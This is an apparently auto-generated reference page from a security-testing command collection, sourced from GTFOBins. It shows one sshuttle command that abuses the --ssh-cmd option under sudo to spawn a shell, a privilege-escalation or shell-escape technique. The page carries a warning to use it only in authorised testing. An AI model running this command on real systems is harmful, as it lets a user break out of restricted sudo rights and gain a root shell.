---
parsed_by: focuslocust
source: commands
type: generated
---
# sshuttle Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## sshuttle

Tool page: [sshuttle](../../tools/linux/sshuttle.md)

### shell

```text
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshuttle` |
| Evidence | Function example preserved from source parser. |
